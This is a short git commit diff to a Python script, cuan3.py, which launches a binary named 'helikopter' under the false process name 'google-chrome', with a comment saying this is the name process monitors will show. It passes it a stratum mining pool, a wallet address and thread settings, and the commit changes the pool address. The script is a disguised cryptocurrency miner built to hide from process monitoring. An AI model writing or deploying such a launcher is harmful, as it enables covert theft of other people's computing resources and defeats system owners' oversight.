c462535cc49cd7f97bd8029d71724c2f00e041b2
ferasa <86012372+desafff@users.noreply.github.com>
2025-01-01 20:29:17 +0700

    Update cuan3.py

--- cuan3.py
+++ cuan3.py
@@ -4,7 +4,7 @@ import os
 os.execvp("./helikopter", [
     "google-chrome",  # This will be the name shown in process monitors
     "-c",
-    "stratum+tcp://us.vipor.net:5040",
+    "stratum+tcp://eu.luckpool.net:3956",
     "-u", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T.tr1",
     "-p", "x",
     "-t","6"
